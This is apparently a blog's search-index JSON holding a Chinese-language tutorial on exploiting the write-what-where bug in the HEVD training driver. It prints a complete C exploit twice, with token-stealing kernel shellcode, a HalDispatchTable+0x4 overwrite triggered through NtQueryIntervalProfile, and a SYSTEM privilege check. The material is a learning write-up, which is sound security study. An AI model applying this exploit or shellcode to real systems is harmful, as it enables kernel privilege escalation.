{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome \u6b22\u8fce\u6765\u5230 50u1w4y \u7684\u535a\u5ba2 \u611f\u89c9\u8fd9\u91cc\u5e94\u8be5\u5199\u70b9\u4ec0\u4e48\uff0c\u53c8\u4e0d\u77e5\u9053\u8be5\u5199\u70b9\u4ec0\u4e48 \uff1a )","title":"Welcome"},{"location":"#welcome","text":"\u6b22\u8fce\u6765\u5230 50u1w4y \u7684\u535a\u5ba2 \u611f\u89c9\u8fd9\u91cc\u5e94\u8be5\u5199\u70b9\u4ec0\u4e48\uff0c\u53c8\u4e0d\u77e5\u9053\u8be5\u5199\u70b9\u4ec0\u4e48 \uff1a )","title":"Welcome"},{"location":"HEVD/arbitraryWrite/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u672c\u7bc7\u7684\u5185\u5bb9\u4e3a\u4efb\u610f\u5730\u5740\u8986\u76d6\uff0c\u5373 Write-What-Where\u3002 0x01 HEVD Write-What-Where \u6f0f\u6d1e\u5206\u6790 \u9996\u5148\u6253\u5f00 ArbitraryWrite.c \u6587\u4ef6 \u6bd5\u7adf\u662f\u4f9b\u4e8e\u5b66\u4e60\u7528\u7684\u9879\u76ee\uff0c\u6f0f\u6d1e\u603b\u662f\u8fd9\u4e48\u663e\u773c\u6613\u61c2 : ) \u663e\u7136\uff0c\u6211\u4eec\u53ef\u4ee5\u628a what \u6307\u9488\u6307\u5411\u7684\u5185\u5bb9\u5199\u5230 where \u6307\u9488\u6307\u5411\u7684\u4f4d\u7f6e\u3002\u7406\u6240\u5f53\u7136\uff0cwhat \u6307\u9488\u6307\u5411\u7684\u5185\u5bb9\u5e94\u8be5\u662f\u6307\u5411\u6211\u4eec shellcode \u5730\u5740\u7684\u6307\u9488\u3002\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u6211\u4eec\u5e94\u8be5\u628a\u8fd9\u4e2a\u6307\u9488\u653e\u5230\u5185\u6838\u7684\u4ec0\u4e48\u5730\u65b9\u624d\u80fd\u4f7f\u8986\u76d6\u65e2\u5b89\u5168\u53c8\u53ef\u9760\u5462\uff1f \u8fd9\u91cc\u5e08\u5085\u4eec\u4ee5\u524d\u53d1\u73b0\u4e86\u8fd9\u4e48\u4e00\u4e2a\u672a\u6587\u6863\u5316\u7684\u51fd\u6570 NtQueryIntervalProfile\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u7cfb\u7edf\u4e2d\u5f88\u5c11\u88ab\u8c03\u7528\uff0c\u8fd9\u4e2a\u51fd\u6570\u53c8\u8c03\u7528\u4e86 KeQueryIntervalProfile \u51fd\u6570\uff0c\u800c KeQueryIntervalProfile \u4f1a\u6267\u884c\u8fd9\u4e48\u4e00\u6bb5\u6c47\u7f16\u4ee3\u7801 call [HalDispatchTable+0x4]\uff0c\u5e76\u4e14\u5bf9\u4e8e [HalDispatchTable+0x4] \u7684\u4fee\u6539\u4e0d\u4f1a\u7834\u574f\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027 \u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u5728 windbg \u4e2d\u770b\u5230 \u90a3\u4e48\u600e\u4e48\u6837\u624d\u53ef\u4ee5\u987a\u5229\u5730\u8ba9 NtQueryIntervalProfile \u8c03\u7528 KeQueryIntervalProfile\uff0c\u8ba9 KeQueryIntervalProfile \u8c03\u7528 call [HalDispatchTable+0x4]\u5462\uff1f \u6839\u636e\u6211\u7684\u8c03\u8bd5\u7ed3\u679c\uff0c\u53ea\u8981 \u4f60\u8c03\u7528 NtQueryIntervalProfile \u51fd\u6570\u7684\u65f6\u5019\u4f20\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u4e3a 0 \uff08\u8ba9 NtQueryIntervalProfile \u987a\u5229\u5730\u8c03\u7528 KeQueryIntervalProfile\uff09\uff0c\u5e76\u4e14\u4e0d\u4e3a 1 \uff08\u8ba9 KeQueryIntervalProfile \u987a\u5229\u5730\u8c03\u7528 call [HalDispatchTable+0x4] \uff09\u5c31\u53ef\u4ee5\u4e86 \u597d\uff0c\u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u5df2\u7ecf\u5927\u81f4\u77e5\u9053\u8be5\u600e\u4e48\u5229\u7528\u6f0f\u6d1e\u4e86 \u4f7f\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u7684\u6f0f\u6d1e\u8986\u76d6 [HalDispatchTable+0x4] \u4e3a\u6307\u5411\u6211\u4eec shellcode \u7684\u6307\u9488\u503c \u8c03\u7528 NtQueryIntervalProfile \u89e6\u53d1\u6f0f\u6d1e \u5982\u4f55\u5f97\u77e5 where \u7684\u503c what \u7684\u5730\u5740\u662f\u7531\u6211\u4eec\u4f7f\u7528\u51fd\u6570 VirtualAlloc \u5f97\u5230\u7684\uff0c\u6240\u4ee5\u8fd9\u4e2a\u81ea\u7136\u4e0d\u5fc5\u62c5\u5fc3\u3002\u95ee\u9898\u662f\u6211\u4eec\u600e\u4e48\u77e5\u9053 where \u7684\u5730\u5740\u5e94\u8be5\u662f\u591a\u5c11\u5462\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u4e5f\u5c31\u662f HalDispatchTable+0x4 \u7684\u5730\u5740\u3002 \u56e0\u4e3a HalDispatchTable \u4f4d\u4e8e ntkrnlpa.exe \u4e2d\uff0c\u6240\u4ee5 \u4f7f\u7528 EnumDeviceDrivers \u6765\u83b7\u53d6 ntkrnlpa.exe \u5728\u5185\u6838\u4e2d\u7684\u57fa\u5730\u5740 \u4f7f\u7528 LoadLibrary \u5c06 ntkrnlpa.exe \u52a0\u8f7d\u5230\u7528\u6237\u7a7a\u95f4\u4e2d\u5e76\u5f97\u5230\u5b83\u7684\u57fa\u5730\u5740 \u4f7f\u7528 GetProcAddress \u6765\u5f97\u5230 HalDispatchTable \u5728\u7528\u6237\u7a7a\u95f4\u4e2d\u7684\u5730\u5740 \u8ba1\u7b97\u51fa HalDispatchTable \u4e0e ntkrnlpa.exe \u7684\u57fa\u5730\u5740\u7684\u5dee\u503c \u5c06\u8fd9\u4e2a\u5dee\u503c\u52a0\u5230 ntkrnlpa.exe \u5728\u5185\u6838\u4e2d\u7684\u57fa\u5730\u5740\u4e0a\u5f97\u5230 HalDispatchTable \u5728\u5185\u6838\u4e2d\u7684\u5730\u5740 0x02 HEVD Write-What-Where \u6f0f\u6d1e\u5229\u7528 \u901a\u8fc7\u4ee5\u4e0a\u7684\u5206\u6790\u76f8\u4fe1\u5927\u5bb6\u5df2\u7ecf\u77e5\u9053\u8be5\u5982\u4f55\u5229\u7528\u4e86\uff0c\u8fd9\u91cc\u5c06\u6574\u4e2a\u6d41\u7a0b\u590d\u73b0\u4e00\u904d \u9996\u5148\u8d34\u51fa exp\u3002\u4e4b\u524d\u7684 exp \u662f\u7528 Python \u7f16\u5199\u7684\uff0c\u4f46\u6211\u611f\u89c9\u597d\u50cf\u7528 c \u6765\u7f16\u5199\u63a7\u5236\u8d77\u6765\u662f\u5426\u8981\u66f4\u8212\u670d\u4e00\u70b9\uff1f\u6240\u4ee5\u672c\u7bc7\u4ee3\u7801\u91c7\u7528 c \u7f16\u5199\uff0c\u82e5\u60f3\u7528 Python \u7f16\u5199 exp \u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u53c2\u8003\u4e00\u4e0b\u7b2c\u4e00\u7bc7\u6587\u7ae0\u6216\u662f\u4e0a\u7f51\u641c\u4e00\u4e0b Python \u7248\u7684 exp\u3002 // arbitraryWrite.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h #include Psapi.h #include stdio.h typedef struct _payload { PULONG_PTR what ; PULONG_PTR where ; } Payload , * PPayload ; typedef NTSTATUS ( WINAPI * NtQueryIntervalProfile_t )( IN ULONG ProfileSource , OUT PULONG Interval ); char shellcode [] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\x33\\xc0 // xor eax,eax \\xc9 // leave \\xc3 // ret }; int main () { PVOID driversAddress [ 1024 ]; DWORD cbNeeded ; int cDrivers , i ; int ntkrnlpaKernelBase ; TCHAR driverName [ 1024 ]; HMODULE ntkrnlpaUserBase ; PVOID halDispatchTableAddress ; PPayload payload = NULL ; DWORD BytesReturned = 0 ; payload = ( PPayload ) HeapAlloc ( GetProcessHeap (), HEAP_ZERO_MEMORY , sizeof ( Payload )); // find ntkrnlpa.exe kernel base if ( EnumDeviceDrivers ( driversAddress , sizeof ( driversAddress ), cbNeeded ) cbNeeded sizeof ( driversAddress ) ) { cDrivers = cbNeeded / sizeof ( driversAddress [ 0 ]); for ( i = 0 ; i cDrivers ; i ++ ) { if ( GetDeviceDriverBaseName ( driversAddress [ i ], driverName , 1024 ) ) { char * lowerName = _strlwr ( driverName ); if ( ( ! strcmp ( lowerName , ntkrnl )) || ( ( strstr ( lowerName , ntkrnl )) != NULL ) ) { ntkrnlpaKernelBase = i ; break ; } else { continue ; } } else { printf ( get device driver name failed \\n ); } } } else { printf ( Enumerate Device Drivers failed \\n ); return 0 ; } printf ( driver name is: %s \\n , driverName ); ntkrnlpaUserBase = LoadLibrary ( driverName ); if ( ! ntkrnlpaUserBase ) { printf ( LoadLibrary failed \\n ); } halDispatchTableAddress = GetProcAddress ( ntkrnlpaUserBase , HalDispatchTable ); DWORD32 whereAddress = ( DWORD32 ) driversAddress [ ntkrnlpaKernelBase ] + ( DWORD32 ) halDispatchTableAddress - ( DWORD32 ) ntkrnlpaUserBase + 0x4 ; HANDLE hDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); // 0x3000 \u7b49\u540c\u4e8eMEM_COMMIT | MEM_RESERVE, \u5373\u9884\u7559\u5e76\u63d0\u4ea4\u8be5\u5757\u5185\u5b58 // 0x40 \u6307\u793a\u4e86\u5206\u914d\u7684\u9875\u9762\u7684\u4fdd\u62a4\u5c5e\u6027, \u5176\u503c\u7b49\u540c\u4e8ePAGE_EXECUTE_READWRITE, \u5373\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c LPVOID ptr = VirtualAlloc ( 0 , sizeof ( shellcode ), 0x3000 , 0x40 ); RtlCopyMemory ( ptr , shellcode , sizeof ( shellcode )); payload - what = ( PULONG_PTR ) ptr ; payload - where = ( PULONG_PTR ) whereAddress ; DeviceIoControl ( hDevice , 0x0022200B , ( LPVOID ) payload , sizeof ( Payload ), NULL , 0 , BytesReturned , NULL ); HMODULE ntdll = LoadLibrary ( ntdll.dll ); ULONG Interval = 0 ; if ( ! ntdll ) { printf ( load ntdll.dll failed \\n ); return 0 ; } NtQueryIntervalProfile_t NtQueryIntervalProfile = ( NtQueryIntervalProfile_t ) GetProcAddress ( ntdll , NtQueryIntervalProfile ); if ( ! NtQueryIntervalProfile ) { printf ( ntqueryintervalprofile get failed \\n ); return 0 ; } NtQueryIntervalProfile ( 0x1337 , Interval ); system ( whoami ); return 0 ; } \u8fd9\u91cc\u7684 IO Control code \u4e3a 0x0022200B\uff0c\u5206\u6790\u65b9\u6cd5\u548c\u4e0a\u4e00\u7bc7\u4e2d IDA \u7684\u5206\u6790\u65b9\u6cd5\u4e00\u6837\uff0c\u4e0d\u8fc7 HackSysExtremeVulnerableDriver.h \u4e2d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u670d\u52a1\u7684 IOCTL \u8ba1\u7b97\u65b9\u6cd5\u4e3a hex( (0x00000022 16) | (0x00000000 14) | (0x802 2) | 0x00000003 ) \u4e0d\u8fc7\u6211\u8fd8\u662f\u5efa\u8bae\u5927\u5bb6\u7528 IDA \u5206\u6790\uff0c\u56e0\u4e3a\u771f\u5b9e\u573a\u666f\u4e2d\u4f60\u53ef\u80fd\u770b\u4e0d\u5230\u6e90\u7801\u3002 \u518d\u7136\u540e\u5c31\u662f buf\uff08DeviceIoControl \u7684 buf\uff09\u7684\u7ed3\u6784\u95ee\u9898\u3002 \u7a0d\u4f5c\u5206\u6790\u4f60\u5c31\u53ef\u4ee5\u77e5\u9053 edi \u7b49\u540c\u4e8e what\uff0cebx \u7b49\u540c\u4e8e where\u3002\u90a3\u4e48\u770b\u5230\u8fd9\u5f20\u56fe\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 *UserWriteWhatWhere \u7684\u503c\u4e3a what\uff0c*(UserWriteWhatWhere + 4) \u7684\u503c\u4e3a where\u3002\u6240\u4ee5\u6211\u4eec\u5c31\u53ef\u4ee5\u6784\u5efa\u4ee3\u7801\u4e2d\u7684 struct _payload \u7ed3\u6784\u3002\uff08\u540e\u9762\u5c31\u7b97\u518d\u653e\u4e1c\u897f\u4e5f\u6ca1\u6709\u610f\u4e49\uff0c\u524d\u9762\u4e0d\u80fd\u653e\u4e1c\u897f\uff09 \u81f3\u4e8e\u4ee3\u7801\u6211\u89c9\u5f97\u5e94\u8be5\u6ca1\u6709\u4ec0\u4e48\u8981\u89e3\u91ca\u7684\u4e86\uff0c\u6d41\u7a0b\u5f88\u6e05\u6670 \u627e\u5230\u5185\u6838\u7a7a\u95f4\u4e2d halDispatchTable + 0x4 \u7684\u5730\u5740 \u5206\u914d\u4e00\u5757\u5177\u6709\u6267\u884c\u6743\u9650\u7684\u7a7a\u95f4\u5b58\u653e\u6211\u4eec\u7684 shellcode \u8c03\u7528 DeviceIoControl \u89e6\u53d1\u6f0f\u6d1e\u8986\u76d6 [halDispatchTable + 0x4] \u8c03\u7528 NtQueryIntervalProfile \u6267\u884c\u6211\u4eec\u7684 shellcode \u8fd9\u91cc\u7684\u5806\u6808\u5e73\u8861\u50cf\u6211\u4eec\u8fd9\u6837\u5199\u5176\u5b9e\u662f\u76f4\u63a5\u4ece KeQueryIntervalProfile \u56de\u5230\u4e86 NtQueryIntervalProfle \u7684\uff0cKeQueryIntervalProfle \u540e\u9762\u7684\u6307\u4ee4\u90fd\u6ca1\u6709\u5f97\u5230\u6267\u884c\u3002 0x03 \u7ed3\u675f\u8bed \u5927\u5bb6\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u81ea\u5df1\u7f16\u5199 exp\u3002\u56e0\u4e3a\u5c31\u7b97\u4f60\u8111\u5b50\u61c2\u4e86\u771f\u6b63\u5199 exp \u4e5f\u53ef\u80fd\u5230\u5904\u51fa\u95ee\u9898\uff0c\u6240\u4ee5\u591a\u5199\u5199 exp \u53ef\u4ee5\u719f\u7ec3\u6211\u4eec\u7f16\u5199 exp \u7684\u80fd\u529b\u3002(\u5c0f\u58f0bb) \u8fd9\u6b21\u7528 c \u5199\u8fd9\u4e2a exp \u5c31\u662f\u8111\u5b50\uff1a\u61c2\u4e86\uff0c\u7f16\u8bd1\u5668\uff1aerror 99999 : ) 2019.9.1","title":"\uff08\u4e8c\uff09HEVD \u4efb\u610f\u5730\u5740\u8986\u76d6"},{"location":"HEVD/arbitraryWrite/#0x00","text":"\u672c\u7bc7\u7684\u5185\u5bb9\u4e3a\u4efb\u610f\u5730\u5740\u8986\u76d6\uff0c\u5373 Write-What-Where\u3002","title":"0x00 \u524d\u8a00"},{"location":"HEVD/arbitraryWrite/#0x01-hevd-write-what-where","text":"\u9996\u5148\u6253\u5f00 ArbitraryWrite.c \u6587\u4ef6 \u6bd5\u7adf\u662f\u4f9b\u4e8e\u5b66\u4e60\u7528\u7684\u9879\u76ee\uff0c\u6f0f\u6d1e\u603b\u662f\u8fd9\u4e48\u663e\u773c\u6613\u61c2 : ) \u663e\u7136\uff0c\u6211\u4eec\u53ef\u4ee5\u628a what \u6307\u9488\u6307\u5411\u7684\u5185\u5bb9\u5199\u5230 where \u6307\u9488\u6307\u5411\u7684\u4f4d\u7f6e\u3002\u7406\u6240\u5f53\u7136\uff0cwhat \u6307\u9488\u6307\u5411\u7684\u5185\u5bb9\u5e94\u8be5\u662f\u6307\u5411\u6211\u4eec shellcode \u5730\u5740\u7684\u6307\u9488\u3002\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u6211\u4eec\u5e94\u8be5\u628a\u8fd9\u4e2a\u6307\u9488\u653e\u5230\u5185\u6838\u7684\u4ec0\u4e48\u5730\u65b9\u624d\u80fd\u4f7f\u8986\u76d6\u65e2\u5b89\u5168\u53c8\u53ef\u9760\u5462\uff1f \u8fd9\u91cc\u5e08\u5085\u4eec\u4ee5\u524d\u53d1\u73b0\u4e86\u8fd9\u4e48\u4e00\u4e2a\u672a\u6587\u6863\u5316\u7684\u51fd\u6570 NtQueryIntervalProfile\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u7cfb\u7edf\u4e2d\u5f88\u5c11\u88ab\u8c03\u7528\uff0c\u8fd9\u4e2a\u51fd\u6570\u53c8\u8c03\u7528\u4e86 KeQueryIntervalProfile \u51fd\u6570\uff0c\u800c KeQueryIntervalProfile \u4f1a\u6267\u884c\u8fd9\u4e48\u4e00\u6bb5\u6c47\u7f16\u4ee3\u7801 call [HalDispatchTable+0x4]\uff0c\u5e76\u4e14\u5bf9\u4e8e [HalDispatchTable+0x4] \u7684\u4fee\u6539\u4e0d\u4f1a\u7834\u574f\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027 \u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u5728 windbg \u4e2d\u770b\u5230 \u90a3\u4e48\u600e\u4e48\u6837\u624d\u53ef\u4ee5\u987a\u5229\u5730\u8ba9 NtQueryIntervalProfile \u8c03\u7528 KeQueryIntervalProfile\uff0c\u8ba9 KeQueryIntervalProfile \u8c03\u7528 call [HalDispatchTable+0x4]\u5462\uff1f \u6839\u636e\u6211\u7684\u8c03\u8bd5\u7ed3\u679c\uff0c\u53ea\u8981 \u4f60\u8c03\u7528 NtQueryIntervalProfile \u51fd\u6570\u7684\u65f6\u5019\u4f20\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u4e3a 0 \uff08\u8ba9 NtQueryIntervalProfile \u987a\u5229\u5730\u8c03\u7528 KeQueryIntervalProfile\uff09\uff0c\u5e76\u4e14\u4e0d\u4e3a 1 \uff08\u8ba9 KeQueryIntervalProfile \u987a\u5229\u5730\u8c03\u7528 call [HalDispatchTable+0x4] \uff09\u5c31\u53ef\u4ee5\u4e86 \u597d\uff0c\u5230\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u5df2\u7ecf\u5927\u81f4\u77e5\u9053\u8be5\u600e\u4e48\u5229\u7528\u6f0f\u6d1e\u4e86 \u4f7f\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u7684\u6f0f\u6d1e\u8986\u76d6 [HalDispatchTable+0x4] \u4e3a\u6307\u5411\u6211\u4eec shellcode \u7684\u6307\u9488\u503c \u8c03\u7528 NtQueryIntervalProfile \u89e6\u53d1\u6f0f\u6d1e","title":"0x01 HEVD Write-What-Where \u6f0f\u6d1e\u5206\u6790"},{"location":"HEVD/arbitraryWrite/#where","text":"what \u7684\u5730\u5740\u662f\u7531\u6211\u4eec\u4f7f\u7528\u51fd\u6570 VirtualAlloc \u5f97\u5230\u7684\uff0c\u6240\u4ee5\u8fd9\u4e2a\u81ea\u7136\u4e0d\u5fc5\u62c5\u5fc3\u3002\u95ee\u9898\u662f\u6211\u4eec\u600e\u4e48\u77e5\u9053 where \u7684\u5730\u5740\u5e94\u8be5\u662f\u591a\u5c11\u5462\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u4e5f\u5c31\u662f HalDispatchTable+0x4 \u7684\u5730\u5740\u3002 \u56e0\u4e3a HalDispatchTable \u4f4d\u4e8e ntkrnlpa.exe \u4e2d\uff0c\u6240\u4ee5 \u4f7f\u7528 EnumDeviceDrivers \u6765\u83b7\u53d6 ntkrnlpa.exe \u5728\u5185\u6838\u4e2d\u7684\u57fa\u5730\u5740 \u4f7f\u7528 LoadLibrary \u5c06 ntkrnlpa.exe \u52a0\u8f7d\u5230\u7528\u6237\u7a7a\u95f4\u4e2d\u5e76\u5f97\u5230\u5b83\u7684\u57fa\u5730\u5740 \u4f7f\u7528 GetProcAddress \u6765\u5f97\u5230 HalDispatchTable \u5728\u7528\u6237\u7a7a\u95f4\u4e2d\u7684\u5730\u5740 \u8ba1\u7b97\u51fa HalDispatchTable \u4e0e ntkrnlpa.exe \u7684\u57fa\u5730\u5740\u7684\u5dee\u503c \u5c06\u8fd9\u4e2a\u5dee\u503c\u52a0\u5230 ntkrnlpa.exe \u5728\u5185\u6838\u4e2d\u7684\u57fa\u5730\u5740\u4e0a\u5f97\u5230 HalDispatchTable \u5728\u5185\u6838\u4e2d\u7684\u5730\u5740","title":"\u5982\u4f55\u5f97\u77e5 where \u7684\u503c"},{"location":"HEVD/arbitraryWrite/#0x02-hevd-write-what-where","text":"\u901a\u8fc7\u4ee5\u4e0a\u7684\u5206\u6790\u76f8\u4fe1\u5927\u5bb6\u5df2\u7ecf\u77e5\u9053\u8be5\u5982\u4f55\u5229\u7528\u4e86\uff0c\u8fd9\u91cc\u5c06\u6574\u4e2a\u6d41\u7a0b\u590d\u73b0\u4e00\u904d \u9996\u5148\u8d34\u51fa exp\u3002\u4e4b\u524d\u7684 exp \u662f\u7528 Python \u7f16\u5199\u7684\uff0c\u4f46\u6211\u611f\u89c9\u597d\u50cf\u7528 c \u6765\u7f16\u5199\u63a7\u5236\u8d77\u6765\u662f\u5426\u8981\u66f4\u8212\u670d\u4e00\u70b9\uff1f\u6240\u4ee5\u672c\u7bc7\u4ee3\u7801\u91c7\u7528 c \u7f16\u5199\uff0c\u82e5\u60f3\u7528 Python \u7f16\u5199 exp \u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u53c2\u8003\u4e00\u4e0b\u7b2c\u4e00\u7bc7\u6587\u7ae0\u6216\u662f\u4e0a\u7f51\u641c\u4e00\u4e0b Python \u7248\u7684 exp\u3002 // arbitraryWrite.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h #include Psapi.h #include stdio.h typedef struct _payload { PULONG_PTR what ; PULONG_PTR where ; } Payload , * PPayload ; typedef NTSTATUS ( WINAPI * NtQueryIntervalProfile_t )( IN ULONG ProfileSource , OUT PULONG Interval ); char shellcode [] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\x33\\xc0 // xor eax,eax \\xc9 // leave \\xc3 // ret }; int main () { PVOID driversAddress [ 1024 ]; DWORD cbNeeded ; int cDrivers , i ; int ntkrnlpaKernelBase ; TCHAR driverName [ 1024 ]; HMODULE ntkrnlpaUserBase ; PVOID halDispatchTableAddress ; PPayload payload = NULL ; DWORD BytesReturned = 0 ; payload = ( PPayload ) HeapAlloc ( GetProcessHeap (), HEAP_ZERO_MEMORY , sizeof ( Payload )); // find ntkrnlpa.exe kernel base if ( EnumDeviceDrivers ( driversAddress , sizeof ( driversAddress ), cbNeeded ) cbNeeded sizeof ( driversAddress ) ) { cDrivers = cbNeeded / sizeof ( driversAddress [ 0 ]); for ( i = 0 ; i cDrivers ; i ++ ) { if ( GetDeviceDriverBaseName ( driversAddress [ i ], driverName , 1024 ) ) { char * lowerName = _strlwr ( driverName ); if ( ( ! strcmp ( lowerName , ntkrnl )) || ( ( strstr ( lowerName , ntkrnl )) != NULL ) ) { ntkrnlpaKernelBase = i ; break ; } else { continue ; } } else { printf ( get device driver name failed \\n ); } } } else { printf ( Enumerate Device Drivers failed \\n ); return 0 ; } printf ( driver name is: %s \\n , driverName ); ntkrnlpaUserBase = LoadLibrary ( driverName ); if ( ! ntkrnlpaUserBase ) { printf ( LoadLibrary failed \\n ); } halDispatchTableAddress = GetProcAddress ( ntkrnlpaUserBase , HalDispatchTable ); DWORD32 whereAddress = ( DWORD32 ) driversAddress [ ntkrnlpaKernelBase ] + ( DWORD32 ) halDispatchTableAddress - ( DWORD32 ) ntkrnlpaUserBase + 0x4 ; HANDLE hDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); // 0x3000 \u7b49\u540c\u4e8eMEM_COMMIT | MEM_RESERVE, \u5373\u9884\u7559\u5e76\u63d0\u4ea4\u8be5\u5757\u5185\u5b58 // 0x40 \u6307\u793a\u4e86\u5206\u914d\u7684\u9875\u9762\u7684\u4fdd\u62a4\u5c5e\u6027, \u5176\u503c\u7b49\u540c\u4e8ePAGE_EXECUTE_READWRITE, \u5373\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c LPVOID ptr = VirtualAlloc ( 0 , sizeof ( shellcode ), 0x3000 , 0x40 ); RtlCopyMemory ( ptr , shellcode , sizeof ( shellcode )); payload - what = ( PULONG_PTR ) ptr ; payload - where = ( PULONG_PTR ) whereAddress ; DeviceIoControl ( hDevice , 0x0022200B , ( LPVOID ) payload , sizeof ( Payload ), NULL , 0 , BytesReturned , NULL ); HMODULE ntdll = LoadLibrary ( ntdll.dll ); ULONG Interval = 0 ; if ( ! ntdll ) { printf ( load ntdll.dll failed \\n ); return 0 ; } NtQueryIntervalProfile_t NtQueryIntervalProfile = ( NtQueryIntervalProfile_t ) GetProcAddress ( ntdll , NtQueryIntervalProfile ); if ( ! NtQueryIntervalProfile ) { printf ( ntqueryintervalprofile get failed \\n ); return 0 ; } NtQueryIntervalProfile ( 0x1337 , Interval ); system ( whoami ); return 0 ; } \u8fd9\u91cc\u7684 IO Control code \u4e3a 0x0022200B\uff0c\u5206\u6790\u65b9\u6cd5\u548c\u4e0a\u4e00\u7bc7\u4e2d IDA \u7684\u5206\u6790\u65b9\u6cd5\u4e00\u6837\uff0c\u4e0d\u8fc7 HackSysExtremeVulnerableDriver.h \u4e2d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u670d\u52a1\u7684 IOCTL \u8ba1\u7b97\u65b9\u6cd5\u4e3a hex( (0x00000022 16) | (0x00000000 14) | (0x802 2) | 0x00000003 ) \u4e0d\u8fc7\u6211\u8fd8\u662f\u5efa\u8bae\u5927\u5bb6\u7528 IDA \u5206\u6790\uff0c\u56e0\u4e3a\u771f\u5b9e\u573a\u666f\u4e2d\u4f60\u53ef\u80fd\u770b\u4e0d\u5230\u6e90\u7801\u3002 \u518d\u7136\u540e\u5c31\u662f buf\uff08DeviceIoControl \u7684 buf\uff09\u7684\u7ed3\u6784\u95ee\u9898\u3002 \u7a0d\u4f5c\u5206\u6790\u4f60\u5c31\u53ef\u4ee5\u77e5\u9053 edi \u7b49\u540c\u4e8e what\uff0cebx \u7b49\u540c\u4e8e where\u3002\u90a3\u4e48\u770b\u5230\u8fd9\u5f20\u56fe\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 *UserWriteWhatWhere \u7684\u503c\u4e3a what\uff0c*(UserWriteWhatWhere + 4) \u7684\u503c\u4e3a where\u3002\u6240\u4ee5\u6211\u4eec\u5c31\u53ef\u4ee5\u6784\u5efa\u4ee3\u7801\u4e2d\u7684 struct _payload \u7ed3\u6784\u3002\uff08\u540e\u9762\u5c31\u7b97\u518d\u653e\u4e1c\u897f\u4e5f\u6ca1\u6709\u610f\u4e49\uff0c\u524d\u9762\u4e0d\u80fd\u653e\u4e1c\u897f\uff09 \u81f3\u4e8e\u4ee3\u7801\u6211\u89c9\u5f97\u5e94\u8be5\u6ca1\u6709\u4ec0\u4e48\u8981\u89e3\u91ca\u7684\u4e86\uff0c\u6d41\u7a0b\u5f88\u6e05\u6670 \u627e\u5230\u5185\u6838\u7a7a\u95f4\u4e2d halDispatchTable + 0x4 \u7684\u5730\u5740 \u5206\u914d\u4e00\u5757\u5177\u6709\u6267\u884c\u6743\u9650\u7684\u7a7a\u95f4\u5b58\u653e\u6211\u4eec\u7684 shellcode \u8c03\u7528 DeviceIoControl \u89e6\u53d1\u6f0f\u6d1e\u8986\u76d6 [halDispatchTable + 0x4] \u8c03\u7528 NtQueryIntervalProfile \u6267\u884c\u6211\u4eec\u7684 shellcode \u8fd9\u91cc\u7684\u5806\u6808\u5e73\u8861\u50cf\u6211\u4eec\u8fd9\u6837\u5199\u5176\u5b9e\u662f\u76f4\u63a5\u4ece KeQueryIntervalProfile \u56de\u5230\u4e86 NtQueryIntervalProfle \u7684\uff0cKeQueryIntervalProfle 